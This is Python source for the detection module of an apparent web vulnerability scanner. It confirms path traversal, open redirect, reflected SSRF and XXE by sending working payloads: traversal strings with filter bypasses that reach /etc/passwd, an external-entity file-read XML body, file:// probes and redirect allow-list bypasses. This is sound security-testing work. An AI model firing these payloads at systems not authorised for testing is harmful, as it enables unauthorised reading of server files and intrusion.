"""Deterministic injection / redirection oracles — path traversal, open redirect,
SSRF, and XXE.

Same discipline as sqli_oracle: a finding is VALIDATED only by an objective,
reproducible signal (a file-content signature reflected back, a 3xx Location that
resolves off-origin, a fetched-URL echo), never by an LLM opinion or a template
match. Anything that merely *looks* suspicious but cannot be objectively
confirmed here is returned as a manual-confirm lead (validated=False upstream),
so recall stays honest and false positives do not get asserted as real.

Fast (short per-request timeout), hang-proof, and offline: none of these oracles
depend on an external collaborator/OOB server. SSRF confirmation is therefore
limited to the *reflected* class (the fetched response is echoed back); a blind
SSRF that only performs an out-of-band request is reported as a lead, not a
validated finding — because we cannot prove it from in-band signals alone.
"""
from __future__ import annotations

from typing import Any, Dict, List, Optional
from urllib.parse import parse_qsl, urlparse, urlencode, urlunparse

import httpx

# ---------------------------------------------------------------------------
# Path traversal (CWE-22 / LFI)
# ---------------------------------------------------------------------------
# Payloads walk up out of a served directory to a file that exists on every
# Linux/Windows host. Multiple encodings cover naive filters (raw, url-encoded,
# double-encoded, and the ....// filter-bypass).
_TRAVERSAL_PAYLOADS = (
    "../../../../../../etc/passwd",
    "..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd",
    "....//....//....//....//....//etc/passwd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "../../../../../../windows/win.ini",
    "..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini",
)
# Signatures that only appear in the real target file — objective proof the
# traversal resolved and the file was served back.
_TRAVERSAL_MARKERS = (
    "root:x:0:0",           # /etc/passwd first line
    "root:x:0:0:root",
    "daemon:x:1:1",         # /etc/passwd second line (defends against a partial
    "[extensions]",         # win.ini
    "[fonts]",              # win.ini
    "; for 16-bit app support",  # win.ini header comment
)
# Params that commonly name a file/path — used to prioritise, not restrict.
_FILE_PARAM_HINTS = (
    "file", "path", "page", "doc", "document", "name", "filename", "template",
    "download", "load", "read", "dir", "folder", "url", "src", "img", "image",
    "attachment", "report", "view", "include", "resource",
)


def _with_param(url: str, param: str, value: str) -> str:
    u = urlparse(url)
    q = dict(parse_qsl(u.query, keep_blank_values=True))
    q[param] = value
    return urlunparse(u._replace(query=urlencode(q)))


async def detect_path_traversal(
    client: httpx.AsyncClient,
    url: str,
    *,
    params: Optional[List[str]] = None,
) -> Optional[Dict[str, Any]]:
    """Inject traversal payloads into each candidate GET param AND, if the path
    ends in a file-like segment, into the trailing path segment. VALIDATED only if
    the response body carries a real system-file signature."""
    tried_params = list(params or [])
    if not tried_params:
        q = dict(parse_qsl(urlparse(url).query, keep_blank_values=True))
        tried_params = list(q) or [None]  # None => path-segment injection below

    # Order params so file-naming ones are tried first (cheaper time-to-signal).
    def _rank(p: Optional[str]) -> int:
        if p is None:
            return 1
        pl = p.lower()
        return 0 if any(h in pl for h in _FILE_PARAM_HINTS) else 2

    for param in sorted(tried_params, key=_rank):
        for payload in _TRAVERSAL_PAYLOADS:
            try:
                if param is None:
                    # inject into the last path segment
                    u = urlparse(url)
                    parts = u.path.rstrip("/").split("/")
                    parts[-1] = payload
                    target = urlunparse(u._replace(path="/".join(parts)))
                    r = await client.get(target)
                else:
                    target = _with_param(url, param, payload)
                    r = await client.get(target)
            except Exception:
                continue
            body = (r.text or "")[:4000]
            low = body.lower()
            if any(m.lower() in low for m in _TRAVERSAL_MARKERS):
                return {
                    "technique": "path_traversal",
                    "endpoint": url,
                    "parameter": param,
                    "payload": payload,
                    "http_status": r.status_code,
                    "file_excerpt": body[:200],
                    "proof": "response returned the contents of a system file outside the web root",
                    "confidence": 1.0,
                }
    return None


# ---------------------------------------------------------------------------
# Open redirect (CWE-601)
# ---------------------------------------------------------------------------
# A sentinel origin we do NOT control but which is unmistakably off-target. If the
# app 3xx-redirects Location to this exact host, redirection is attacker-controlled.
_REDIRECT_SENTINEL = "https://osop-redirect-sentinel.example.net/pwn"
_REDIRECT_SENTINEL_HOST = "osop-redirect-sentinel.example.net"
_REDIRECT_PAYLOADS = (
    _REDIRECT_SENTINEL,
    "//osop-redirect-sentinel.example.net/pwn",
    "https:osop-redirect-sentinel.example.net/pwn",
    "/\\osop-redirect-sentinel.example.net/pwn",
)
_REDIRECT_PARAM_HINTS = (
    "url", "redirect", "redir", "next", "return", "returnto", "return_to",
    "returnurl", "goto", "dest", "destination", "continue", "to", "out",
    "target", "link", "forward", "callback", "redirect_uri",
)


async def detect_open_redirect(
    client: httpx.AsyncClient,
    url: str,
    *,
    params: Optional[List[str]] = None,
    allowlist_hints: Optional[List[str]] = None,
    **_ignore: Any,
) -> Optional[Dict[str, Any]]:
    """Inject an off-origin sentinel into redirect-like params. VALIDATED only if
    the server answers 3xx with a Location resolving to the sentinel host (not our
    target) — proving the redirect target is attacker-controlled.

    ``allowlist_hints`` are allow-listed URLs harvested from the target itself
    (e.g. redirect literals in its JS bundle). Many real redirectors guard the
    param with a *substring* allow-list; smuggling a hint as a query suffix of the
    sentinel (``https://<sentinel>/?x=<hint>``) passes the filter while the browser
    still lands on the sentinel host — the canonical allow-list bypass. The oracle
    only fires on a sentinel-host Location, so a hardened allow-list that truly
    redirects to the hint's host produces no false positive."""
    q = dict(parse_qsl(urlparse(url).query, keep_blank_values=True))
    candidate_params = list(params or []) or list(q)
    # Prefer redirect-named params; if none exist, still try any present param.
    ranked = sorted(
        candidate_params,
        key=lambda p: 0 if any(h in p.lower() for h in _REDIRECT_PARAM_HINTS) else 1,
    )
    if not ranked:
        return None

    # Base payloads + allow-list-bypass variants built from harvested hints.
    payloads = list(_REDIRECT_PAYLOADS)
    for hint in (allowlist_hints or [])[:4]:
        if not hint:
            continue
        payloads.append(f"{_REDIRECT_SENTINEL}?x={hint}")   # sentinel host, hint as suffix
        payloads.append(f"https://{_REDIRECT_SENTINEL_HOST}/?x={hint}")
        payloads.append(f"https://{_REDIRECT_SENTINEL_HOST}/{hint}")

    # Follow_redirects MUST be off so we can read the raw Location header.
    for param in ranked:
        for payload in payloads:
            try:
                target = _with_param(url, param, payload)
                r = await client.get(target, follow_redirects=False)
            except Exception:
                continue
            if r.status_code not in (301, 302, 303, 307, 308):
                continue
            loc = r.headers.get("location") or r.headers.get("Location") or ""
            host = urlparse(loc if "://" in loc else "http:" + loc if loc.startswith("//") else loc).netloc.lower()
            if _REDIRECT_SENTINEL_HOST in loc.lower() and _REDIRECT_SENTINEL_HOST in (host or loc.lower()):
                return {
                    "technique": "open_redirect",
                    "endpoint": url,
                    "parameter": param,
                    "payload": payload,
                    "http_status": r.status_code,
                    "location": loc[:300],
                    "proof": "server issued a 3xx redirect to an attacker-controlled off-origin host",
                    "confidence": 1.0,
                }
    return None


# ---------------------------------------------------------------------------
# SSRF (CWE-918) — reflected class only (offline-provable)
# ---------------------------------------------------------------------------
# We can only VALIDATE SSRF in-band when the fetched resource is echoed back. We
# point the app at a local file:// or at itself and look for the fetched content
# in the response. A blind SSRF (OOB-only) cannot be proven offline, so those
# candidates are returned as leads by the caller, not asserted.
_SSRF_PROBES = (
    ("file:///etc/passwd", _TRAVERSAL_MARKERS),
    ("file:///c:/windows/win.ini", ("[extensions]", "[fonts]")),
)
_SSRF_PARAM_HINTS = (
    "url", "uri", "link", "src", "source", "target", "dest", "fetch", "load",
    "image", "img", "avatar", "callback", "webhook", "feed", "proxy", "path",
    "download", "remote", "endpoint", "host", "site", "domain", "next", "data",
)


async def detect_ssrf_reflected(
    client: httpx.AsyncClient,
    url: str,
    *,
    params: Optional[List[str]] = None,
) -> Optional[Dict[str, Any]]:
    """Point a URL-taking param at file:// and look for the fetched file content
    reflected in the response. VALIDATED only on that reflection — the strongest
    in-band SSRF signal available without an out-of-band collaborator."""
    q = dict(parse_qsl(urlparse(url).query, keep_blank_values=True))
    candidate_params = list(params or []) or list(q)
    ranked = [p for p in candidate_params if any(h in p.lower() for h in _SSRF_PARAM_HINTS)]
    if not ranked:
        return None
    for param in ranked:
        for probe, markers in _SSRF_PROBES:
            try:
                target = _with_param(url, param, probe)
                r = await client.get(target)
            except Exception:
                continue
            low = (r.text or "")[:4000].lower()
            if any(m.lower() in low for m in markers):
                return {
                    "technique": "ssrf_reflected",
                    "endpoint": url,
                    "parameter": param,
                    "payload": probe,
                    "http_status": r.status_code,
                    "proof": "server fetched an attacker-supplied URI and reflected its contents",
                    "confidence": 1.0,
                }
    return None


# ---------------------------------------------------------------------------
# XXE (CWE-611) — reflected file-read class only
# ---------------------------------------------------------------------------
# Classic external-entity file read. VALIDATED only if the parsed entity's file
# content comes back in the response. Only ever sent to endpoints that advertise
# XML handling (accepts/returns xml) so we do not spray XML at JSON APIs.
_XXE_FILES = (
    ("file:///etc/passwd", _TRAVERSAL_MARKERS),
    ("file:///c:/windows/win.ini", ("[extensions]", "[fonts]")),
)


def _xxe_body(file_uri: str, root: str = "osop", field: str = "data") -> str:
    """Build an external-entity file-read doc against a specific XML SCHEMA.

    Real XML endpoints validate the document against their own schema and reject
    a foreign root/field before the parser ever reflects the entity — so a fixed
    ``<osop><data>`` payload only ever confirms on a target that happens to accept
    that shape. Targeting the app's OWN root+field (discovered from a sample
    request, e.g. ginandjuice.shop's ``<stockCheck><productId>``) is what lets the
    entity reach a reflected field on a real target."""
    return (
        '<?xml version="1.0" encoding="UTF-8"?>'
        f'<!DOCTYPE {root} [<!ENTITY xxe SYSTEM "{file_uri}">]>'
        f"<{root}><{field}>&xxe;</{field}></{root}>"
    )


def _xxe_schemas_from_sample(sample_xml: Optional[str]) -> List[Tuple[str, str]]:
    """Derive (root_tag, first_child_tag) from a sample XML request body so the
    payload can be built against the app's real schema. Returns [] when no usable
    schema is found; the caller always also tries the generic <osop><data> shape."""
    if not sample_xml:
        return []
    import re as _re

    tags = _re.findall(r"<([A-Za-z_][\w.-]*)\b[^>]*>", sample_xml)
    # skip the XML declaration / DOCTYPE artifacts
    tags = [t for t in tags if t.lower() not in ("xml", "doctype")]
    if len(tags) >= 2:
        return [(tags[0], tags[1])]
    if len(tags) == 1:
        return [(tags[0], "data")]
    return []


async def detect_xxe(
    client: httpx.AsyncClient,
    url: str,
    *,
    method: str = "POST",
    sample_xml: Optional[str] = None,
) -> Optional[Dict[str, Any]]:
    """POST an XML doc with an external-entity file read. VALIDATED only if the
    file signature is reflected in the response.

    When ``sample_xml`` (a legitimate request body captured from the target) is
    provided, the payload is ALSO built against the app's own root+field schema,
    not just the generic ``<osop><data>`` shape — the recall fix that lets this
    detect XXE on schema-validating endpoints like a stock-check API. Confirmation
    is unchanged: a real local-file signature must appear in the response, so a
    blind/OOB-only or entity-hardened parser still (correctly) does NOT confirm."""
    # Schemas to try: the app's own (from the sample) first, then the generic.
    schemas = _xxe_schemas_from_sample(sample_xml) + [("osop", "data")]
    attempts: List[Tuple[str, Tuple[str, ...], str, str]] = []
    for root, field in schemas:
        for file_uri, markers in _XXE_FILES:
            attempts.append((_xxe_body(file_uri, root, field), markers, root, field))

    for body, markers, root, field in attempts:
        try:
            r = await client.request(
                method, url, content=body,
                headers={"Content-Type": "application/xml", "Accept": "application/xml, */*"},
            )
        except Exception:
            continue
        low = (r.text or "")[:4000].lower()
        if any(m.lower() in low for m in markers):
            return {
                "technique": "xxe",
                "endpoint": url,
                "payload": f"external-entity file:// read via <{root}><{field}>",
                "http_status": r.status_code,
                "proof": (
                    "XML parser resolved an external entity and reflected a local "
                    f"file (schema <{root}><{field}>)"
                ),
                "confidence": 1.0,
            }
    return None


if __name__ == "__main__":
    # Self-check against a local target. These oracles do NOT assert a finding on
    # juice-shop (it is not path-traversal/open-redirect/SSRF/XXE vulnerable on the
    # probed surface) — the check just proves they run clean and hang-proof.
    import asyncio
    import sys

    target = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:3000"

    async def _main():
        async with httpx.AsyncClient(verify=False, timeout=10) as c:
            for name, coro in (
                ("path_traversal", detect_path_traversal(c, target + "/ftp/quarantine")),
                ("open_redirect", detect_open_redirect(c, target + "/redirect?to=x")),
                ("ssrf", detect_ssrf_reflected(c, target + "/profile/image/url?url=x")),
            ):
                try:
                    ev = await asyncio.wait_for(coro, timeout=30)
                except Exception as e:
                    ev = f"error:{e}"
                print(f"{name:16s} -> {ev}")

    asyncio.run(_main())
    print("OK: injection oracles ran clean")
